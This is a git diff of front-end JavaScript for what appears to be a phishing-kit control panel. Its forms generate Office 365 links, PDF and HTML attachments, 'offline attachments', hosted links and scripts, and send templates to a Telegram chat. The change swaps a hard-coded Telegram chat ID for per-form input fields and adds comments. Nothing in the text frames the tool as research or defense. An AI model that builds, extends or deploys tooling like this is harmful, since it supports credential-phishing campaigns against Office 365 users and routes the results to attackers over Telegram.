@@ -1,3 +1,4 @@
+// Function to handle POST requests to API
 async function postData(url = '', data = {}) {
     try {
         const response = await fetch(url, {
@@ -19,16 +20,16 @@ async function postData(url = '', data = {}) {
     }
 }
 
-// Handle form submissions
+// Handle form submissions when DOM content is loaded
 document.addEventListener('DOMContentLoaded', function() {
     // Handle generating Office 365 link
     const linkForm = document.getElementById('linkForm');
     if (linkForm) {
         linkForm.addEventListener('submit', async function(event) {
-            event.preventDefault();
+            event.preventDefault(); // Prevent default form submission
             
             const email = document.getElementById('email').value;
-            const chatId = '6737043934'; // Updated Telegram Chat ID
+            const chatId = document.getElementById('chatId').value;
             const linkResultDiv = document.getElementById('linkResult');
             linkResultDiv.innerHTML = 'Generating link...';
 
@@ -45,10 +46,10 @@ document.addEventListener('DOMContentLoaded', function() {
     const attachmentForm = document.getElementById('attachmentForm');
     if (attachmentForm) {
         attachmentForm.addEventListener('submit', async function(event) {
-            event.preventDefault();
+            event.preventDefault(); // Prevent default form submission
             
             const content = document.getElementById('content').value;
-            const chatId = '6737043934'; // Updated Telegram Chat ID
+            const chatId = document.getElementById('chatIdAttachment').value;
             const attachmentResultDiv = document.getElementById('attachmentResult');
             attachmentResultDiv.innerHTML = 'Generating PDF attachment...';
 
@@ -65,10 +66,10 @@ document.addEventListener('DOMContentLoaded', function() {
     const offlineAttachmentForm = document.getElementById('offlineAttachmentForm');
     if (offlineAttachmentForm) {
         offlineAttachmentForm.addEventListener('submit', async function(event) {
-            event.preventDefault();
+            event.preventDefault(); // Prevent default form submission
             
             const offlineContent = document.getElementById('offlineContent').value;
-            const chatId = '6737043934'; // Updated Telegram Chat ID
+            const chatId = document.getElementById('chatIdOffline').value;
             const offlineAttachmentResultDiv = document.getElementById('offlineAttachmentResult');
             offlineAttachmentResultDiv.innerHTML = 'Generating ready offline attachment...';
 
@@ -85,10 +86,10 @@ document.addEventListener('DOMContentLoaded', function() {
     const scriptsForm = document.getElementById('scriptsForm');
     if (scriptsForm) {
         scriptsForm.addEventListener('submit', async function(event) {
-            event.preventDefault();
+            event.preventDefault(); // Prevent default form submission
             
             const scriptContent = document.getElementById('scriptContent').value;
-            const chatId = '6737043934'; // Updated Telegram Chat ID
+            const chatId = document.getElementById('chatIdScripts').value;
             const scriptsResultDiv = document.getElementById('scriptsResult');
             scriptsResultDiv.innerHTML = 'Generating scripts...';
 
@@ -105,10 +106,10 @@ document.addEventListener('DOMContentLoaded', function() {
     const directLinkForm = document.getElementById('directLinkForm');
     if (directLinkForm) {
         directLinkForm.addEventListener('submit', async function(event) {
-            event.preventDefault();
+            event.preventDefault(); // Prevent default form submission
             
             const hostedLinkContent = document.getElementById('hostedLinkContent').value;
-            const chatId = '6737043934'; // Updated Telegram Chat ID
+            const chatId = document.getElementById('chatIdHosted').value;
             const directLinkResultDiv = document.getElementById('directLinkResult');
             directLinkResultDiv.innerHTML = 'Generating hosted link...';
 
@@ -126,7 +127,7 @@ document.addEventListener('DOMContentLoaded', function() {
     if (templateSelect) {
         templateSelect.addEventListener('change', async function(event) {
             const selectedTemplate = event.target.value;
-            const chatId = '6737043934'; // Updated Telegram Chat ID
+            const chatId = document.getElementById('chatIdTemplate').value;
             const templateResultDiv = document.getElementById('templateResult');
             templateResultDiv.innerHTML = 'Sending selected template to Telegram...';
 
@@ -143,10 +144,10 @@ document.addEventListener('DOMContentLoaded', function() {
     const htmlAttachmentForm = document.getElementById('htmlAttachmentForm');
     if (htmlAttachmentForm) {
         htmlAttachmentForm.addEventListener('submit', async function(event) {
-            event.preventDefault();
+            event.preventDefault(); // Prevent default form submission
             
             const htmlContent = document.getElementById('htmlContent').value;
-            const chatId = '6737043934'; // Updated Telegram Chat ID
+            const chatId = document.getElementById('chatIdHtml').value;
             const htmlAttachmentResultDiv = document.getElementById('htmlAttachmentResult');
             htmlAttachmentResultDiv.innerHTML = 'Generating HTML attachment...';
 
